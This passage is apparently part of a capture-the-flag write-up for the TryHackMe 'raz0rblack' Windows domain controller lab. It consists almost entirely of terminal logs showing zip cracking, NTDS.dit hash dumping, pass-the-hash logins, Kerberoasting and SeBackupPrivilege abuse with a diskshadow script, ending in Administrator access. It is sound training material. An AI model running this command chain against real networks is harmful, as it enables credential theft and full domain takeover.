Get file experiment_gone_wrong.zip? y
parallel_read returned NT_STATUS_IO_TIMEOUT
Get file sbradley.txt? y
getting file \experiment_gone_wrong.zip of size 18927164 as experiment_gone_wrong.zip getting file \sbradley.txt of size 37 as sbradley.txt (0.1 KiloBytes/sec) (average 0.9 KiloBytes/sec)
smb: \> recurse on
smb: \> prompt on
smb: \> mget *
getting file \chat_log_20210222143423.txt of size 1340 as chat_log_20210222143423.txt (1.9 KiloBytes/sec) (average 1.3 KiloBytes/sec)
getting file \experiment_gone_wrong.zip of size 18927164 as experiment_gone_wrong.zip (1423.3 KiloBytes/sec) (average 1223.6 KiloBytes/sec)
getting file \sbradley.txt of size 37 as sbradley.txt (0.0 KiloBytes/sec) (average 1161.6 KiloBytes/sec)
smb: \> exit
```

```shell
root@rE3oN:~/thm/machines/medium/raz0rblack# cat chat_log_20210222143423.txt
sbradley> Hey Administrator our machine has the newly disclosed vulnerability for Windows Server 2019.
Administrator> What vulnerability??
sbradley> That new CVE-2020-1472 which is called ZeroLogon has released a new PoC.
Administrator> I have given you the last warning. If you exploit this on this Domain Controller as you did previously on our old Ubuntu server with dirtycow, I swear I will kill your WinRM-Access.
sbradley> Hey you won't believe what I am seeing.
Administrator> Now, don't say that you ran the exploit.
sbradley> Yeah, The exploit works great it needs nothing like credentials. Just give it IP and domain name and it resets the Administrator pass to an empty hash.
sbradley> I also used some tools to extract ntds. dit and SYSTEM.hive and transferred it into my box. I love running secretsdump.py on those files and dumped the hash.
Administrator> I am feeling like a new cron has been issued in my body named heart attack which will be executed within the next minute.
Administrator> But, Before I die I will kill your WinRM access..........
sbradley> I have made an encrypted zip containing the ntds.dit and the SYSTEM.hive and uploaded the zip inside the trash share.
sbradley> Hey Administrator are you there ...
sbradley> Administrator .....

The administrator died after this incident.

Press F to pay respects

root@rE3oN:~/thm/machines/medium/raz0rblack# cat sbradley.txt
THM{ab53e05c9a98def00314a14ccbfa8104}                                                                 
root@rE3oN:~/thm/machines/medium/raz0rblack# zip2john experiment_gone_wrong.zip > john_hash.txt
ver 2.0 efh 5455 efh 7875 experiment_gone_wrong.zip/system.hive PKZIP Encr: TS_chk, cmplen=2941739, decmplen=16281600, crc=BDCCA7E2 ts=591C cs=591c type=8
ver 2.0 efh 5455 efh 7875 experiment_gone_wrong.zip/ntds.dit PKZIP Encr: TS_chk, cmplen=15985077, decmplen=58720256, crc=68037E87 ts=5873 cs=5873 type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
```

```shell
root@rE3oN:~/thm/machines/medium/raz0rblack# john --wordlist=/usr/share/wordlists/rockyou.txt john_hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
electromagnetismo (experiment_gone_wrong.zip)
1g 0:00:00:00 DONE (2022-07-12 20:28) 1.428g/s 11983Kp/s 11983Kc/s 11983KC/s elliotfrost..ejsa457
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

```shell
root@rE3oN:~/thm/machines/medium/raz0rblack# unzip experiment_gone_wrong.zip
Archive:  experiment_gone_wrong.zip
[experiment_gone_wrong.zip] system.hive password:
  inflating: system.hive
  inflating: ntds.dit
```

```shell
root@rE3oN:~/thm/machines/medium/raz0rblack# python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -system system.hive -ntds ntds.dit LOCAL | tee secretsdump.txt

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0x17a0a12951d502bb3c14cf1d495a71ad
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 84bf0a79cd645db4f94b24c35cfdf7c7
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:1afedc472d0fdfe07cd075d36804efd0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HAVEN-DC$:1000:aad3b435b51404eeaad3b435b51404ee:4ea59b8f64c94ec66ddcfc4e6e5899f9:::
```

```shell
root@rE3oN:~/thm/machines/medium/raz0rblack# crackmapexec smb 10.10.44.6 -u lvetrova -p hash1.txt --continue-on-success
SMB         10.10.44.6      445    HAVEN-DC         [*] Windows 10.0 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False)
SMB         10.10.44.6      445    HAVEN-DC         [+] raz0rblack.thm\lvetrova:f220d3988deb3f516c73f40ee16c431d
```

```shell
root@rE3oN:~/thm/machines/medium/raz0rblack# evil-winrm -i 10.10.44.6 -u lvetrova -H f220d3988deb3f516c73f40ee16c431d

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\lvetrova\Documents> dir
*Evil-WinRM* PS C:\Users\lvetrova\Documents> cd ..
*Evil-WinRM* PS C:\Users\lvetrova> cd Desktop
*Evil-WinRM* PS C:\Users\lvetrova\Desktop> dir
*Evil-WinRM* PS C:\Users\lvetrova\Desktop> cd ..
*Evil-WinRM* PS C:\Users\lvetrova> ls


    Directory: C:\Users\lvetrova


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        9/15/2018  12:19 AM                Desktop
d-r---        2/25/2021  10:14 AM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d-r---        9/15/2018  12:19 AM                Music
d-r---        9/15/2018  12:19 AM                Pictures
d-----        9/15/2018  12:19 AM                Saved Games
d-r---        9/15/2018  12:19 AM                Videos
-a----        2/25/2021  10:16 AM           1692 lvetrova.xml


*Evil-WinRM* PS C:\Users\lvetrova> type lvetrova.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">Your Flag is here =&gt;</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb010000009db56a0543f441469fc81aadb02945d20000000002000000000003660000c000000010000000069a026f82c590fa867556fe4495ca870000000004800000a0000000100000003b5bf64299ad06afde3fc9d6efe72d35500000002828ad79f53f3f38ceb3d8a8c41179a54dc94cab7b17ba52d0b9fc62dfd4a205f2bba2688e8e67e5cbc6d6584496d107b4307469b95eb3fdfd855abe27334a5fe32a8b35a3a0b6424081e14dc387902414000000e6e36273726b3c093bbbb4e976392a874772576d</SS>
    </Props>
  </Obj>
</Objs>

*Evil-WinRM* PS C:\Users\lvetrova> $Credential = Import-Clixml -Path "lvetrova.xml"
*Evil-WinRM* PS C:\Users\lvetrova> $Credential.GetNetworkCredential().password
THM{694362e877adef0d85a92e6d17551fe4}
```

```shell
root@rE3oN:~/thm/machines/medium/raz0rblack# python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -dc-ip 10.10.44.6 raz0rblack.thm/lvetrova -hashes f220d3988deb3f516c73f40ee16c431d:f220d3988deb3f516c73f40ee16c431d -outputfile getuserspn_hash.txt
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName                   Name     MemberOf                                                    PasswordLastSet             LastLogon  Delegation
-------------------------------------  -------  ----------------------------------------------------------  --------------------------  ---------  ----------
HAVEN-DC/xyan1d3.raz0rblack.thm:60111  xyan1d3  CN=Remote Management Users,CN=Builtin,DC=raz0rblack,DC=thm  2021-02-23 20:47:17.715160  <never>



[-] CCache file is not found. Skipping...

root@rE3oN:~/thm/machines/medium/raz0rblack# cat getuserspn_hash.txt
$krb5tgs$23$*xyan1d3$RAZ0RBLACK.THM$raz0rblack.thm/xyan1d3*$77b3200f15e1cb9f70fadf12c569aa95$dacc41a175c5bec980c91ac6113accad36f78df66f98a57a72df793a2a7a328f7584a4bc421a7e67a42222582ccbc8eed4fa969282b29cbc7e82f594a803f84ba69e1ca02ea9d951bba0936366b6fac4128c74e98ec11775b079b2f72f221697aef376de6bd30a079297a9eefd9732f48ed6d84a385ab6f410fc0e0090d22c0559cb891ae8c27697784e9ad6abae935701f70136f3af05cfd5b7d530f6dcf9f7ea3cf0219a8f6bf716f9839a7380189f6262c6bcaedcc14b85a767685d61be78be961645277eb2d2aa0ffeaf7ac89f20a7dd249aeeccf5e992d62bac04a3728f55711b56ed55c6f73fbba2a3f35a520119e7b540d46e774fe507f563c611bffaf6d8fff09608bfc8a3771971f51ec0e8bde787972fcaf48cdac3494d12b4abdda86f4bbf598cf0f3ada07aa553bc54dda1e0ee5ffb296aeef04ed28cfb556774c8bae5faa11b38ef0500f8df349f5a80659e688853a2b6167fb4235143cc732d58e03d52c644c35246f80104ba87a0986d323558d1cf15c939fa470a37091d1a7997fae9113a01d8819bb6af9414330549df910cebd5b8f2b4d83cc43a905ae6806ff21327c8b73f703158a158435e0f479944d83e641be0750fad796b4b4ef1ba3d4a375579806c34a449d265f0e609dfea37dabd47cc10efe414659179e97f3e410556f78bf28bc889161f84e8eb6b45f87a1845a02ee77003819e9616c402f757ae1ac1e8c7e8fbb501bbe57b3935b16f9b18339c8ea6adbb9e671d7bdf02d97aec92a632a7d1ad624a9eacf4943ba4ee66f7fa49970d6a004e17162e2970e87b143682bf49276f1e5a590826b85a1b17018c6305db15950d10a2e633d1589e7081f647f400c220533e9f8929ae91096d28b59726e19797af1e9987f913446b720ef497df94f5724b9ba0192ee556a3d042628fca10d6dc804378b4f06f3e3500e3338892acffa1d3e529f2a458ea734de86d9f03b204420ada4082932ca8c97665dac15ecbac83d4b9c7c8fc9716321a69a8379c47b0921fd279b3dd0ad932f56660cd22a3be9dd1a1b86214b9fed0880886550ff697c21e3a4a83f3f19bda5d4d1e6a78b751d494569a91dd260ee5aa3e50878aaa1121f0aee2c956ca50fd948d6ffd2b03d825c872e72493a6a3d0b33bf9e675aab057e4f48076ede0298c36ae827fb5c7cdc69cf6d36b1dcaba406feda2a2e8a38b3078d5002c4eb885d2fd6029c1c524a2150b9f01a955aa474bd78d1de580bea2df192aefcf798e8d0f41294fd9f699f10ee341cf068af0e3b3f7b79a1e1ce52e78e2b6b8bb9744201d3c5e40408b08b4263e6f3f220c08288df096aa98834945ef87700420e58ba72aeba7f34d83a5f837b30f5970c764a3e6bcf7c42ca66ab03e762dd25499826483d10d9a85e40aeabcac4104e18088
```

```shell
root@rE3oN:~/thm/machines/medium/raz0rblack# hashcat -m 13100 getuserspn_hash.txt /usr/share/wordlists/rockyou.txt | tee getuserspn-password.txt
hashcat (v6.2.5) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================
* Device #1: pthread-0x000, 1439/2942 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*xyan1d3$RAZ0RBLACK.THM$raz0rblack.thm/xyan1d3*$77b3200f15e1cb9f70fadf12c569aa95$dacc41a175c5bec980c91ac6113accad36f78df66f98a57a72df793a2a7a328f7584a4bc421a7e67a42222582ccbc8eed4fa969282b29cbc7e82f594a803f84ba69e1ca02ea9d951bba0936366b6fac4128c74e98ec11775b079b2f72f221697aef376de6bd30a079297a9eefd9732f48ed6d84a385ab6f410fc0e0090d22c0559cb891ae8c27697784e9ad6abae935701f70136f3af05cfd5b7d530f6dcf9f7ea3cf0219a8f6bf716f9839a7380189f6262c6bcaedcc14b85a767685d61be78be961645277eb2d2aa0ffeaf7ac89f20a7dd249aeeccf5e992d62bac04a3728f55711b56ed55c6f73fbba2a3f35a520119e7b540d46e774fe507f563c611bffaf6d8fff09608bfc8a3771971f51ec0e8bde787972fcaf48cdac3494d12b4abdda86f4bbf598cf0f3ada07aa553bc54dda1e0ee5ffb296aeef04ed28cfb556774c8bae5faa11b38ef0500f8df349f5a80659e688853a2b6167fb4235143cc732d58e03d52c644c35246f80104ba87a0986d323558d1cf15c939fa470a37091d1a7997fae9113a01d8819bb6af9414330549df910cebd5b8f2b4d83cc43a905ae6806ff21327c8b73f703158a158435e0f479944d83e641be0750fad796b4b4ef1ba3d4a375579806c34a449d265f0e609dfea37dabd47cc10efe414659179e97f3e410556f78bf28bc889161f84e8eb6b45f87a1845a02ee77003819e9616c402f757ae1ac1e8c7e8fbb501bbe57b3935b16f9b18339c8ea6adbb9e671d7bdf02d97aec92a632a7d1ad624a9eacf4943ba4ee66f7fa49970d6a004e17162e2970e87b143682bf49276f1e5a590826b85a1b17018c6305db15950d10a2e633d1589e7081f647f400c220533e9f8929ae91096d28b59726e19797af1e9987f913446b720ef497df94f5724b9ba0192ee556a3d042628fca10d6dc804378b4f06f3e3500e3338892acffa1d3e529f2a458ea734de86d9f03b204420ada4082932ca8c97665dac15ecbac83d4b9c7c8fc9716321a69a8379c47b0921fd279b3dd0ad932f56660cd22a3be9dd1a1b86214b9fed0880886550ff697c21e3a4a83f3f19bda5d4d1e6a78b751d494569a91dd260ee5aa3e50878aaa1121f0aee2c956ca50fd948d6ffd2b03d825c872e72493a6a3d0b33bf9e675aab057e4f48076ede0298c36ae827fb5c7cdc69cf6d36b1dcaba406feda2a2e8a38b3078d5002c4eb885d2fd6029c1c524a2150b9f01a955aa474bd78d1de580bea2df192aefcf798e8d0f41294fd9f699f10ee341cf068af0e3b3f7b79a1e1ce52e78e2b6b8bb9744201d3c5e40408b08b4263e6f3f220c08288df096aa98834945ef87700420e58ba72aeba7f34d83a5f837b30f5970c764a3e6bcf7c42ca66ab03e762dd25499826483d10d9a85e40aeabcac4104e18088:cyanide9amine5628

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*xyan1d3$RAZ0RBLACK.THM$raz0rblack.thm/...e18088
Time.Started.....: Wed Jul 13 19:54:30 2022 (5 secs)
Time.Estimated...: Wed Jul 13 19:54:35 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1773.9 kH/s (0.43ms) @ Accel:256 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 8867840/14344385 (61.82%)
Rejected.........: 0/8867840 (0.00%)
Restore.Point....: 8866816/14344385 (61.81%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: cybernickisgay -> cy4ever

Started: Wed Jul 13 19:54:30 2022
Stopped: Wed Jul 13 19:54:37 2022

```

```shell
root@rE3oN:~/thm/machines/medium/raz0rblack# evil-winrm -i 10.10.44.6 -u xyan1d3 -p cyanide9amine5628

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\xyan1d3\Documents> ls
*Evil-WinRM* PS C:\Users\xyan1d3\Documents> cd ..
*Evil-WinRM* PS C:\Users\xyan1d3> ls


    Directory: C:\Users\xyan1d3


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        9/15/2018  12:19 AM                Desktop
d-r---        2/25/2021   9:34 AM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d-r---        9/15/2018  12:19 AM                Music
d-r---        9/15/2018  12:19 AM                Pictures
d-----        9/15/2018  12:19 AM                Saved Games
d-r---        9/15/2018  12:19 AM                Videos
-a----        2/25/2021   9:33 AM           1826 xyan1d3.xml


*Evil-WinRM* PS C:\Users\xyan1d3> type xyan1d3.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">Nope your flag is not here</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb010000006bc3424112257a48aa7937963e14ed790000000002000000000003660000c000000010000000f098beb903e1a489eed98b779f3c70b80000000004800000a000000010000000e59705c44a560ce4c53e837d111bb39970000000feda9c94c6cd1687ffded5f438c59b080362e7e2fe0d9be8d2ab96ec7895303d167d5b38ce255ac6c01d7ac510ef662e48c53d3c89645053599c00d9e8a15598e8109d23a91a8663f886de1ba405806944f3f7e7df84091af0c73a4effac97ad05a3d6822cdeb06d4f415ba19587574f1400000051021e80fd5264d9730df52d2567cd7285726da2</SS>
    </Props>
  </Obj>
</Objs>
*Evil-WinRM* PS C:\Users\xyan1d3> $Credential = Import-Clixml -Path "xyan1d3.xml"
*Evil-WinRM* PS C:\Users\xyan1d3> $Credential.GetNetworkCredential().password
LOL here it is -> THM{62ca7e0b901aa8f0b233cade0839b5bb}
```

```txt
set metadata C:\tmp\tmp.cabs 
set context persistent nowriters 
add volume c: alias someAlias 
create 
expose %someAlias% w: 
```


```shell
root@rE3oN:~/thm/machines/medium/raz0rblack# evil-winrm -i 10.10.148.194 -u xyan1d3 -p cyanide9amine5628

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\xyan1d3\Documents> mkdir C:\tmp


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/13/2022   8:26 AM                tmp


*Evil-WinRM* PS C:\Users\xyan1d3\Documents> cd C:\tmp
*Evil-WinRM* PS C:\tmp> ls
*Evil-WinRM* PS C:\tmp> upload diskshadow.txt
Info: Uploading diskshadow.txt to C:\tmp\diskshadow.txt


Data: 164 bytes of 164 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\tmp> diskshadow.exe /s C:\tmp\diskshadow.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  HAVEN-DC,  7/13/2022 8:28:23 AM

-> set metadata C:\tmp\tmp.cabs
-> set context persistent nowriters
-> add volume c: alias someAlias
-> create
Alias someAlias for shadow ID {7d238505-6690-4be2-9358-88f6595699fb} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {d7aaa77a-0261-4dbf-a29d-92289b81815c} set as environment variable.

Querying all shadow copies with the shadow copy set ID {d7aaa77a-0261-4dbf-a29d-92289b81815c}

        * Shadow copy ID = {7d238505-6690-4be2-9358-88f6595699fb}               %someAlias%
                - Shadow copy set: {d7aaa77a-0261-4dbf-a29d-92289b81815c}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{115c1f55-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 7/13/2022 8:28:26 AM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: HAVEN-DC.raz0rblack.thm
                - Service machine: HAVEN-DC.raz0rblack.thm
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %someAlias% w:
-> %someAlias% = {7d238505-6690-4be2-9358-88f6595699fb}
The shadow copy was successfully exposed as w:\.
*Evil-WinRM* PS C:\tmp> upload SeBackupPrivilegeCmdLets.dll
Info: Uploading SeBackupPrivilegeCmdLets.dll to C:\tmp\SeBackupPrivilegeCmdLets.dll


Data: 16384 bytes of 16384 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\tmp> upload SeBackupPrivilegeUtils.dll
Info: Uploading SeBackupPrivilegeUtils.dll to C:\tmp\SeBackupPrivilegeUtils.dll


Data: 21844 bytes of 21844 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\tmp> Import-Module .\SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\tmp> Import-Module .\SeBackupPrivilegeUtils.dll
*Evil-WinRM* PS C:\tmp> Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit C:\tmp\ntds.dit -Overwrite
*Evil-WinRM* PS C:\tmp> reg save HKLM\SYSTEM c:\tmp\system.hive
The operation completed successfully.

*Evil-WinRM* PS C:\tmp> ls


    Directory: C:\tmp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/13/2022   8:27 AM            125 diskshadow.txt
-a----        7/13/2022   8:30 AM       16777216 ntds.dit
-a----        7/13/2022   8:28 AM          12288 SeBackupPrivilegeCmdLets.dll
-a----        7/13/2022   8:29 AM          16384 SeBackupPrivilegeUtils.dll
-a----        7/13/2022   8:31 AM       17219584 system.hive
-a----        7/13/2022   8:28 AM            640 tmp.cabs


*Evil-WinRM* PS C:\tmp> ls


    Directory: C:\tmp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/13/2022   8:27 AM            125 diskshadow.txt
-a----        7/13/2022   8:30 AM       16777216 ntds.dit
-a----        7/13/2022   8:28 AM          12288 SeBackupPrivilegeCmdLets.dll
-a----        7/13/2022   8:29 AM          16384 SeBackupPrivilegeUtils.dll
-a----        7/13/2022   8:31 AM       17219584 system.hive
-a----        7/13/2022   8:28 AM            640 tmp.cabs



*Evil-WinRM* PS C:\tmp> download ntds.dit
Info: Downloading ntds.dit to ./ntds.dit


Info: Download successful!

*Evil-WinRM* PS C:\tmp> download /tmp/ntds.dit
Info: Downloading /tmp/ntds.dit to ./ntds.dit


Info: Download successful!

*Evil-WinRM* PS C:\tmp> download /tmp/system.hive
Info: Downloading /tmp/system.hive to ./system.hive


Info: Download successful!


```

```shell
root@rE3oN:~/thm/machines/medium/raz0rblack# python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -system system.hive -ntds ntds.dit LOCAL | tee secretsdump_1.txt
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0xf1582a79dd00631b701d3d15e75e59f6
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: f6162bb347993035d66a15417d73a667
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9689931bed40ca5a2ce1218210177f0c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HAVEN-DC$:1000:aad3b435b51404eeaad3b435b51404ee:26cc019045071ea8ad315bd764c4f5c6:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fa3c456268854a917bd17184c85b4fd1:::
raz0rblack.thm\xyan1d3:1106:aad3b435b51404eeaad3b435b51404ee:bf11a3cbefb46f7194da2fa190834025:::
raz0rblack.thm\lvetrova:1107:aad3b435b51404eeaad3b435b51404ee:f220d3988deb3f516c73f40ee16c431d:::
raz0rblack.thm\sbradley:1108:aad3b435b51404eeaad3b435b51404ee:351c839c5e02d1ed0134a383b628426e:::
raz0rblack.thm\twilliams:1109:aad3b435b51404eeaad3b435b51404ee:351c839c5e02d1ed0134a383b628426e:::
[*] Kerberos keys from ntds.dit
Administrator:aes256-cts-hmac-sha1-96:ab77c0dd6f5a28b63c4ae5f0eb89ad48f3ed43d52dc42f1dca2e99d8fc9cdbbf
Administrator:aes128-cts-hmac-sha1-96:81a749369e929b7f1731489b12a49df8
Administrator:des-cbc-md5:d3b646b65bceb5c7
HAVEN-DC$:aes256-cts-hmac-sha1-96:d6b41169e02a4543b90a8c697b167948413397c30f1bf5f0199a54f387358fc6
HAVEN-DC$:aes128-cts-hmac-sha1-96:5ed5bd57484ca826e09afa6e5b944c27
HAVEN-DC$:des-cbc-md5:f71a0dc89b9d079d
krbtgt:aes256-cts-hmac-sha1-96:eed4acbdf1b6cc2b3c1aef992a8cea74d8b0c4ad5b4deecf47c57c4d9465caf5
krbtgt:aes128-cts-hmac-sha1-96:3dbbd202aa0343d1b8df99785d2befbb
krbtgt:des-cbc-md5:857a46f13e91eae3
raz0rblack.thm\xyan1d3:aes256-cts-hmac-sha1-96:6de380d21ae165f55e7520ee3c4a81417bf6a25b17f72ce119083846d89a031f
raz0rblack.thm\xyan1d3:aes128-cts-hmac-sha1-96:9f5a0114b2c18ea63a32a1b8553d4f61
raz0rblack.thm\xyan1d3:des-cbc-md5:e9a1a46223cd8975
raz0rblack.thm\lvetrova:aes256-cts-hmac-sha1-96:3809e38e24ecb746dc0d98e2b95f39fc157de38a9081b3973db5be4c25d5ad39
raz0rblack.thm\lvetrova:aes128-cts-hmac-sha1-96:3676941361afe1800b8ab5d5a15bd839
raz0rblack.thm\lvetrova:des-cbc-md5:385d6e1f1cc17fb6
raz0rblack.thm\sbradley:aes256-cts-hmac-sha1-96:ddd43169c2235d3d2134fdb2ff4182abdb029a20724e679189a755014e68bab5
raz0rblack.thm\sbradley:aes128-cts-hmac-sha1-96:7cdf6640a975c86298b9f48000047580
raz0rblack.thm\sbradley:des-cbc-md5:83fe3e584f4a5bf8
raz0rblack.thm\twilliams:aes256-cts-hmac-sha1-96:05bac51a4b8888a484e0fa1400d8f507b195c4367198024c6806d8eb401cb559
raz0rblack.thm\twilliams:aes128-cts-hmac-sha1-96:a37656829f443e3fe2630aa69af5cb5a
raz0rblack.thm\twilliams:des-cbc-md5:01e958b0ea6edf07
[*] Cleaning up...
```

```shell
root@rE3oN:~/thm/machines/medium/raz0rblack# evil-winrm -i 10.10.57.247 -u Administrator -H 9689931bed40ca5a2ce1218210177f0c

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> ls
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> ls


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        5/21/2021   9:45 AM                3D Objects
d-r---        5/21/2021   9:45 AM                Contacts
d-r---        5/21/2021   9:45 AM                Desktop
d-r---        5/21/2021   9:45 AM                Documents
d-r---        5/21/2021   9:45 AM                Downloads
d-r---        5/21/2021   9:45 AM                Favorites
d-r---        5/21/2021   9:45 AM                Links
d-r---        5/21/2021   9:45 AM                Music
d-r---        5/21/2021   9:45 AM                Pictures
d-r---        5/21/2021   9:45 AM                Saved Games
d-r---        5/21/2021   9:45 AM                Searches
d-r---        5/21/2021   9:45 AM                Videos
-a----        2/25/2021   1:08 PM            290 cookie.json
-a----        2/25/2021   1:12 PM           2512 root.xml


*Evil-WinRM* PS C:\Users\Administrator> type root.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">Administrator</S>
      <SS N="Password">44616d6e20796f752061726520612067656e6975732e0a4275742c20492061706f6c6f67697a6520666f72206368656174696e6720796f75206c696b6520746869732e0a0a4865726520697320796f757220526f6f7420466c61670a54484d7b31623466343663633466626134363334383237336431386463393164613230647d0a0a546167206d65206f6e2068747470733a2f2f747769747465722e636f6d2f5879616e3164332061626f75742077686174207061727420796f7520656e6a6f796564206f6e207468697320626f7820616e642077686174207061727420796f75207374727567676c656420776974682e0a0a496620796f7520656e6a6f796564207468697320626f7820796f75206d617920616c736f2074616b652061206c6f6f6b20617420746865206c696e75786167656e637920726f6f6d20696e207472796861636b6d652e0a576869636820636f6e7461696e7320736f6d65206c696e75782066756e64616d656e74616c7320616e642070726976696c65676520657363616c6174696f6e2068747470733a2f2f7472796861636b6d652e636f6d2f726f6f6d2f6c696e75786167656e63792e0a</SS>
  </Obj>
</Objs>
```

```python
root@rE3oN:~/thm/machines/medium# python3
Python 3.10.5 (main, Jun  8 2022, 09:26:22) [GCC 11.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
